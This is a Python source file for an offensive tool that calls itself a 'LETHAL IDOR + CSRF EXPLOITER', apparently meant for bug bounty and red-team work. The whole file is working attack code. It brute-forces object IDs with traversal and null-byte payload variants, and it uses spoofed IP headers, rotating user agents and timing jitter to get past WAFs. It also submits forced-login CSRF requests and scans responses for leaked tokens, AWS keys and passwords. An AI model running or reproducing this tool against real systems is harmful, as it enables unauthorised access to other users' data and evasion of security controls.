import requests
import argparse
import os
import re
from colorama import Fore, init
from datetime import datetime
from prettytable import PrettyTable
from urllib.parse import urlparse, parse_qs
import xml.etree.ElementTree as ET
import random
import time
# Banner y configuración inicial
import sys
def print_banner(silent=False):
    if silent:
        return
    banner = r"""
           _      _____ _______ _    _          _      
          | |    | ____|__   __| |  | |   /\   | |    
          | |    | |__    | |  | |__| |  /  \  | |    
          | |    |  __|   | |  |  __  | / /\ \ | |    
          | |____| |____  | |  | |  | |/ ____ \| |____
          |______|______| |_|  |_|  |_/_/    \_\______|
                                     
          LETHAL IDOR + CSRF EXPLOITER – VERSIÓN 2.1 ⚔️
   Autor: Zuk4r1 | github.com/Zuk4r1 | BugBounty/RedTeam Edition
    """
    print(Fore.LIGHTRED_EX + banner + Fore.RESET)

init(autoreset=True)

OUTPUT_DIR = "output"
BURP_LOG_PATH = "burp_logs.txt"

if not os.path.exists(OUTPUT_DIR):
    os.makedirs(OUTPUT_DIR)

def extraer_idors_desde_logs(path, silent=False):
    if not silent:
        print(f"{Fore.YELLOW}[+] Extrayendo posibles parámetros IDOR desde {path}...")
    sospechosos = set()
    patron = re.compile(r"[?&](\w*(_id|Id|ID|user|account|uid|pid))=\d+")
    with open(path, 'r', errors='ignore') as f:
        for linea in f:
            encontrados = patron.findall(linea)
            for p in encontrados:
                sospechosos.add(p[0])
    if not silent:
        print(f"{Fore.GREEN}[+] Parámetros IDOR sospechosos encontrados: {list(sospechosos)}")
    return list(sospechosos)

def cargar_ids(path):
    with open(path, 'r') as f:
        return [line.strip() for line in f if line.strip()]

def configurar_headers(cabeceras):
    headers = {}
    if cabeceras:
        for h in cabeceras:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()
    return headers

def log_resultados(tabla, archivo="output/resultados.txt", silent=False):
    with open(archivo, 'w') as f:
        f.write(tabla.get_string())
    if not silent:
        print(f"{Fore.YELLOW}[+] Resultados guardados en: {archivo}")

def random_user_agent():
    # Lista simple, puedes expandirla
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (X11; Linux x86_64)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
        "Mozilla/5.0 (Android 11; Mobile; rv:89.0)"
    ]
    return random.choice(agents)

def sleep_jitter(min_delay=0.2, max_delay=1.2):
    time.sleep(random.uniform(min_delay, max_delay))

def advanced_bypass_headers(headers=None):
    # Añade cabeceras para evadir WAFs y controles básicos
    advanced = {
        "X-Original-URL": "/",
        "X-Forwarded-For": f"127.0.0.{random.randint(2,254)}",
        "X-Remote-IP": f"127.0.0.{random.randint(2,254)}",
        "X-Client-IP": f"127.0.0.{random.randint(2,254)}",
        "X-Host": "localhost",
        "X-Forwarded-Host": "localhost",
        "User-Agent": random_user_agent()
    }
    if headers:
        advanced.update(headers)
    return advanced

def explotar_login_csrf(url, email, password, verification, redirect_url, token, headers, proxy=None, silent=False):
    data = {
        "loginRedirectUrl": redirect_url,
        "verificationCode": verification,
        "email": email,
        "password": password,
        "token": token
    }

    proxies = {"http": proxy, "https": proxy} if proxy else None
    if not silent:
        print(f"{Fore.YELLOW}[+] Ejecutando autenticación forzada REAL...")

    # Añadir headers avanzados para evadir controles
    req_headers = advanced_bypass_headers(headers.copy() if headers else None)

    try:
        response = requests.post(url, json=data, headers=req_headers, proxies=proxies)
        if not silent:
            print(f"{Fore.GREEN}[+] Código HTTP: {response.status_code}")
            print(f"{Fore.GREEN}[+] Respuesta: {response.text[:200]}...")
        return {"id": "CSRF/Login", "status": response.status_code, "desc": "Autenticación forzada enviada con éxito", "vulnerable": response.ok}
    except Exception as e:
        if not silent:
            print(f"{Fore.RED}[!] Error en autenticación forzada: {e}")
        return {"id": "CSRF/Login", "status": "ERROR", "desc": str(e), "vulnerable": False}

def es_bloqueada(resp, forbidden_signature, baseline_len=None):
    """
    Algoritmo inteligente para distinguir respuestas bloqueadas:
    - Código HTTP 401/403/429
    - Firma de texto prohibido
    - Longitud muy similar a baseline de acceso denegado
    - Respuestas vacías o con patrones típicos de error
    """
    if resp.status_code in [401, 403, 429]:
        return True, "HTTP prohibido"
    if forbidden_signature and forbidden_signature.lower() in resp.text.lower():
        return True, "Firma de texto prohibido"
    if baseline_len is not None:
        diff = abs(len(resp.text) - baseline_len)
        if diff < 20:  # margen de tolerancia
            return True, "Longitud similar a acceso denegado"
    if not resp.text.strip():
        return True, "Respuesta vacía"
    if re.search(r"(error|denied|forbidden|not authorized|no autorizado|acceso denegado)", resp.text, re.I):
        return True, "Patrón de error detectado"
    return False, ""

def obtener_baseline_denegado(url, param_name, headers, forbidden_signature, method, proxy=None):
    """
    Realiza una petición con un ID improbable para obtener la respuesta típica de acceso denegado.
    """
    id_fake = "999999999999999"
    if f"{param_name}=" in url:
        objetivo = re.sub(f"{param_name}=[^&]*", f"{param_name}={id_fake}", url)
    else:
        conector = "&" if "?" in url else "?"
        objetivo = f"{url}{conector}{param_name}={id_fake}"
    proxies = {"http": proxy, "https": proxy} if proxy else None
    try:
        resp = requests.request(method=method, url=objetivo, headers=headers, proxies=proxies)
        return resp, len(resp.text)
    except Exception:
        return None, None

def advanced_payloads(id_value):
    """
    Genera variantes de payloads para maximizar la explotación y evadir controles.
    """
    payloads = [
        id_value,
        f"{id_value}/*",
        f"{id_value}%20",
        f"{id_value}/",
        f"{id_value}.json",
        f"{id_value}.xml",
        f"{id_value}?",
        f"{id_value}%09",
        f"{id_value}%00",
        f"{id_value};",
        f"{id_value}#",
        f"{id_value}@",
        f"{id_value}..;/",
        f"{id_value}../",
        f"{id_value}%2e%2e%2f",
        f"{id_value}%252e%252e%252f"
    ]
    return payloads

def detect_sensitive_info(text):
    """
    Busca patrones de información sensible en la respuesta.
    """
    patterns = [
        r"eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9._-]{10,}\.[a-zA-Z0-9._-]{10,}",  # JWT
        r"AKIA[0-9A-Z]{16}",  # AWS Key
        r"(?i)flag\{.*?\}",
        r"(?i)password.{0,10}[:=].{0,50}",
        r"(?i)secret.{0,10}[:=].{0,50}",
        r"(?i)api[_-]?key.{0,10}[:=].{0,50}",
        r"(?i)session.{0,10}[:=].{0,50}",
        r"(?i)token.{0,10}[:=].{0,50}"
    ]
    for pat in patterns:
        if re.search(pat, text):
            return True
    return False

def explotar_idor(url, param_name, id_list, headers, forbidden_signature, method, proxy=None, silent=False):
    proxies = {"http": proxy, "https": proxy} if proxy else None
    resultados = []

    baseline_resp, baseline_len = obtener_baseline_denegado(url, param_name, headers, forbidden_signature, method, proxy)
    if not silent and baseline_resp is not None:
        print(f"{Fore.LIGHTBLACK_EX}[i] Baseline acceso denegado: HTTP {baseline_resp.status_code}, longitud {baseline_len}")

    for id in id_list:
        for payload in advanced_payloads(id):
            if f"{param_name}=" in url:
                objetivo = re.sub(f"{param_name}=[^&]*", f"{param_name}={payload}", url)
            else:
                conector = "&" if "?" in url else "?"
                objetivo = f"{url}{conector}{param_name}={payload}"

            req_headers = advanced_bypass_headers(headers.copy() if headers else None)

            if not silent:
                print(f"{Fore.CYAN}[*] Probando ID {payload} en {objetivo} (headers avanzados)")

            try:
                resp = requests.request(method=method, url=objetivo, headers=req_headers, proxies=proxies, timeout=10)
                bloqueada, razon = es_bloqueada(resp, forbidden_signature, baseline_len)
                sensitive = ""
                if not bloqueada and detect_sensitive_info(resp.text):
                    sensitive = " [¡Datos sensibles detectados!]"

                if bloqueada:
                    if not silent:
                        print(f"{Fore.LIGHTBLACK_EX}[-] ID {payload} bloqueado ({razon})")
                    resultados.append({
                        "id": payload,
                        "status": resp.status_code,
                        "desc": f"Acceso denegado ({razon})",
                        "vulnerable": False
                    })
                else:
                    if not silent:
                        print(f"{Fore.GREEN}[+] ¡ID {payload} potencialmente vulnerable!{sensitive}")
                    resultados.append({
                        "id": payload,
                        "status": resp.status_code,
                        "desc": f"Acceso autorizado (longitud {len(resp.text)}){sensitive}",
                        "vulnerable": True
                    })
            except Exception as e:
                if not silent:
                    print(f"{Fore.RED}[!] Error con ID {payload}: {e}")
                resultados.append({"id": payload, "status": "ERROR", "desc": str(e), "vulnerable": False})

            sleep_jitter(0.1, 0.7)  # Más rápido pero aún evasivo

    return resultados

def imprimir_tabla(resultados, silent=False):
    tabla = PrettyTable(["ID probado", "Resultado", "Descripción", "¿Vulnerable?"])
    tabla.align["Descripción"] = "l"
    tabla.align["ID probado"] = "c"
    tabla.align["Resultado"] = "c"
    tabla.align["¿Vulnerable?"] = "c"
    # Ordena para mostrar vulnerables primero
    resultados = sorted(resultados, key=lambda x: not x["vulnerable"])
    for r in resultados:
        tabla.add_row([r["id"], r["status"], r["desc"], "Sí" if r["vulnerable"] else "No"])
    if not silent:
        print(tabla)
    return tabla

def extraer_endpoints_burp_xml(xml_path, silent=False):
    """
    Extrae endpoints y parámetros potencialmente explotables desde un export XML de Burp Suite.
    Retorna una lista de tuplas: (url, param_name)
    """
    if not silent:
        print(f"{Fore.YELLOW}[+] Analizando export XML de Burp Suite: {xml_path}")
    endpoints = []
    patrones = re.compile(r"(?:^|_)(id|Id|ID|user|userId|account|uid|pid)(?:$|_)")
    try:
        tree = ET.parse(xml_path)
        root = tree.getroot()
        for item in root.iter("item"):
            url = item.findtext("url")
            if not url:
                continue
            parsed = urlparse(url)
            qs = parse_qs(parsed.query)
            for param in qs:
                if patrones.search(param):
                    endpoints.append((url, param))
        if not silent:
            print(f"{Fore.GREEN}[+] Endpoints y parámetros sospechosos encontrados: {endpoints}")
    except Exception as e:
        if not silent:
            print(f"{Fore.RED}[!] Error analizando XML de Burp: {e}")
    return endpoints

def parse_burp_json(json_path, silent=False):
    """
    Extrae endpoints y parámetros potencialmente explotables desde un export JSON de Burp Suite.
    Retorna una lista de tuplas: (url, param_name)
    """
    import json
    if not silent:
        print(f"{Fore.YELLOW}[+] Analizando export JSON de Burp Suite: {json_path}")
    endpoints = []
    patrones = re.compile(r"(?:^|_)(id|Id|ID|user|userId|account|uid|pid)(?:$|_)")
    try:
        with open(json_path, "r", encoding="utf-8", errors="ignore") as f:
            data = json.load(f)
        for item in data.get("items", []):
            url = item.get("url")
            if not url:
                continue
            parsed = urlparse(url)
            qs = parse_qs(parsed.query)
            for param in qs:
                if patrones.search(param):
                    endpoints.append((url, param))
        if not silent:
            print(f"{Fore.GREEN}[+] Endpoints y parámetros sospechosos encontrados (JSON): {endpoints}")
    except Exception as e:
        if not silent:
            print(f"{Fore.RED}[!] Error analizando JSON de Burp: {e}")
    return endpoints

def save_file(filepath, content):
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(content)

def load_payloads(path="exploits/payloads.json"):
    try:
        import json
        with open(path, "r", encoding="utf-8") as f:
            data = json.load(f)
        return data.get("payloads", [])
    except Exception:
        # fallback a los hardcodeados
        return advanced_payloads("FUZZ")

def autorize_advanced(url, param_name, id_list, headers, forbidden_signature, method, proxy=None, silent=False, alt_headers=None):
    """
    Prueba avanzada de autorización: compara la respuesta autenticada vs. no autenticada o con otro usuario.
    alt_headers: cabeceras alternativas para simular otro usuario/token/cookie.
    """
    proxies = {"http": proxy, "https": proxy} if proxy else None
    resultados = []

    baseline_resp, baseline_len = obtener_baseline_denegado(url, param_name, headers, forbidden_signature, method, proxy)
    if not silent and baseline_resp is not None:
        print(f"{Fore.LIGHTBLACK_EX}[i] Baseline acceso denegado: HTTP {baseline_resp.status_code}, longitud {baseline_len}")

    for id in id_list:
        for payload in advanced_payloads(id):
            if f"{param_name}=" in url:
                objetivo = re.sub(f"{param_name}=[^&]*", f"{param_name}={payload}", url)
            else:
                conector = "&" if "?" in url else "?"
                objetivo = f"{url}{conector}{param_name}={payload}"

            # 1. Petición autenticada (headers originales)
            req_headers = advanced_bypass_headers(headers.copy() if headers else None)
            # 2. Petición no autenticada o con otro usuario (alt_headers)
            alt_req_headers = advanced_bypass_headers(alt_headers.copy() if alt_headers else {})

            if not silent:
                print(f"{Fore.CYAN}[*] Autorize: Probando ID {payload} en {objetivo}")

            try:
                resp_auth = requests.request(method=method, url=objetivo, headers=req_headers, proxies=proxies, timeout=10)
                resp_alt = requests.request(method=method, url=objetivo, headers=alt_req_headers, proxies=proxies, timeout=10)
                bloqueada, razon = es_bloqueada(resp_alt, forbidden_signature, baseline_len)
                sensitive = ""
                if not bloqueada and detect_sensitive_info(resp_alt.text):
                    sensitive = " [¡Datos sensibles detectados!]"

                if bloqueada:
                    if not silent:
                        print(f"{Fore.LIGHTBLACK_EX}[-] ID {payload} bloqueado para usuario alternativo ({razon})")
                    resultados.append({
                        "id": payload,
                        "status": resp_alt.status_code,
                        "desc": f"Acceso denegado para usuario alternativo ({razon})",
                        "vulnerable": False
                    })
                else:
                    # Compara respuestas: si la respuesta del usuario alternativo es igual a la autenticada, posible bypass
                    if resp_auth.text.strip() == resp_alt.text.strip():
                        if not silent:
                            print(f"{Fore.GREEN}[+] ¡Bypass de autorización detectado con ID {payload}!{sensitive}")
                        resultados.append({
                            "id": payload,
                            "status": resp_alt.status_code,
                            "desc": f"Bypass de autorización (usuario alternativo obtiene misma respuesta){sensitive}",
                            "vulnerable": True
                        })
                    else:
                        if not silent:
                            print(f"{Fore.YELLOW}[~] Respuesta diferente para usuario alternativo (no vulnerable)")
                        resultados.append({
                            "id": payload,
                            "status": resp_alt.status_code,
                            "desc": f"Respuesta diferente para usuario alternativo",
                            "vulnerable": False
                        })
            except Exception as e:
                if not silent:
                    print(f"{Fore.RED}[!] Error con ID {payload}: {e}")
                resultados.append({"id": payload, "status": "ERROR", "desc": str(e), "vulnerable": False})

            sleep_jitter(0.1, 0.7)
    return resultados

def advanced_cli_parser():
    parser = argparse.ArgumentParser(
        description="⚔️ Herramienta Definitiva IDOR + CSRF Exploiter",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument("--url", required=True, help="URL objetivo con ?param=ID o endpoint login")
    parser.add_argument("--param", help="Parámetro de ID para IDOR")
    parser.add_argument("--ids", help="Archivo con IDs")
    parser.add_argument("--method", default="GET", help="Método HTTP")
    parser.add_argument("--header", action="append", help="Cabeceras personalizadas: 'Key: Value'")
    parser.add_argument("--forbidden", default="Access Denied", help="Texto que indica acceso denegado")
    parser.add_argument("--proxy", help="Proxy tipo http://127.0.0.1:8080 (Burp Suite)")
    parser.add_argument("--email", help="Email válido")
    parser.add_argument("--password", help="Password válida")
    parser.add_argument("--code", help="Verification Code")
    parser.add_argument("--redirect", help="Redirect URL")
    parser.add_argument("--token", help="Token válido para autenticación")
    parser.add_argument("--autoidor", action="store_true", help="Extraer automáticamente parámetros IDOR desde logs de Burp")
    parser.add_argument("--silent", action="store_true", help="Modo Red Team Silencioso: sin banners ni mensajes, solo resultados en .txt")
    parser.add_argument("--burp-logs", help="Archivo XML exportado de Burp Suite para detección automática de endpoints vulnerables")
    parser.add_argument("--burp-json", help="Archivo JSON exportado de Burp Suite para detección automática de endpoints vulnerables")
    parser.add_argument("--payloads", help="Archivo JSON con payloads avanzados")
    parser.add_argument("--autorize", action="store_true", help="Prueba avanzada de autorización (tipo Autorize)")
    parser.add_argument("--alt-header", action="append", help="Cabeceras alternativas para usuario/cookie/token alternativo: 'Key: Value'")
    return parser

def main():
    parser = advanced_cli_parser()
    args = parser.parse_args()
    headers = configurar_headers(args.header)
    alt_headers = configurar_headers(args.alt_header) if args.alt_header else {}
    print_banner(args.silent)

    resultados = []

    # Payloads avanzados
    global advanced_payloads
    if args.payloads:
        custom_payloads = load_payloads(args.payloads)
        advanced_payloads = lambda id_value: [p.replace("FUZZ", str(id_value)) for p in custom_payloads]

    # Burp XML
    if args.burp_logs and args.ids:
        endpoints = extraer_endpoints_burp_xml(args.burp_logs, args.silent)
        id_list = cargar_ids(args.ids)
        for url, param in endpoints:
            resultados.extend(explotar_idor(
                url, param, id_list,
                headers, args.forbidden, args.method.upper(),
                args.proxy, args.silent
            ))
    # Burp JSON
    elif args.burp_json and args.ids:
        endpoints = parse_burp_json(args.burp_json, args.silent)
        id_list = cargar_ids(args.ids)
        for url, param in endpoints:
            resultados.extend(explotar_idor(
                url, param, id_list,
                headers, args.forbidden, args.method.upper(),
                args.proxy, args.silent
            ))
    # CSRF Exploit
    elif args.email and args.password and args.code and args.redirect and args.token:
        resultados.append(explotar_login_csrf(
            args.url, args.email, args.password,
            args.code, args.redirect, args.token,
            headers, args.proxy, args.silent
        ))
    # AutoIDOR
    elif args.autoidor:
        sospechosos = extraer_idors_desde_logs(BURP_LOG_PATH, args.silent)
        if args.ids:
            id_list = cargar_ids(args.ids)
            for param in sospechosos:
                resultados.extend(explotar_idor(
                    args.url, param, id_list,
                    headers, args.forbidden, args.method.upper(),
                    args.proxy, args.silent
                ))
        else:
            if not args.silent:
                print(f"{Fore.RED}[!] Debes proporcionar --ids para usar --autoidor")
            exit(1)
    # Autorize avanzado
    elif args.autorize and args.param and args.ids:
        id_list = cargar_ids(args.ids)
        resultados.extend(autorize_advanced(
            args.url, args.param, id_list,
            headers, args.forbidden, args.method.upper(),
            args.proxy, args.silent, alt_headers
        ))
    # Manual IDOR
    elif args.param and args.ids:
        id_list = cargar_ids(args.ids)
        resultados.extend(explotar_idor(
            args.url, args.param, id_list,
            headers, args.forbidden, args.method.upper(),
            args.proxy, args.silent
        ))
    else:
        if not args.silent:
            print(f"{Fore.RED}[!] Debes proporcionar datos de login, archivo de IDs + parámetro de IDOR, usar --autoidor o --burp-logs/--burp-json")
        exit(1)

    tabla = imprimir_tabla(resultados, args.silent)
    log_resultados(tabla, silent=args.silent)

if __name__ == "__main__":
    main()
